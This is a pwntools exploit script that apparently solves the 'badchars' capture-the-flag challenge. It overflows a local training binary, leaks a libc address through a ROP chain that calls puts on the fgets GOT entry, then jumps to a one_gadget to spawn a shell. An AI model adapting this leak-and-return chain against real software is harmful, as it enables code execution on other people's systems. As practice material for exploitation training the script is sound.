#import pwntools
from pwn import *

#initialize the process
target=process('./badchars')

#define the elf used
elf=ELF('./badchars')

#find the libc used by the elf
libc=elf.libc

#print initial data
print(target.recvuntil("s\n> "))

#construct first ROPchain

#initial payload
payload="A"*40

#gadgets,got and plt values
poprdi=0x400b39
poprsir15=0x400b41
fgets_got=0x601048
system_plt=0x4006f0
puts_plt=0x4006e0
pwnme=0x4008f5
one_gadget=0xe652b

#leak address of fgets in randomized libc
payload+=p64(poprdi)
payload+=p64(fgets_got)
payload+=p64(puts_plt)

#return to pwnme
payload+=p64(pwnme)
payload+=p64(0x0)

#send first payload
target.sendline(payload)

#recv the leak and unpack as a 64-bit address
leak=target.recvuntil("\x0a")
leak=leak.strip("\x0a")
libc_fgets=u64(leak+"\x00"*(8-len(leak)))

#get libc base address and address of execve("/bin/sh",NULL,NULL)
libc_base=libc_fgets-libc.symbols["fgets"]
libc_gadget=libc_base+one_gadget

#print libc addresses
print(hex(libc_fgets))
print(hex(libc_base))

#second ROPchain

#initial payload
payload="A"*40

# call execve("/bin/sh",NULL,NULL)
payload+=p64(libc_gadget)

#send the second payload
target.sendline(payload)

#interact with the spawned shell
target.interactive()





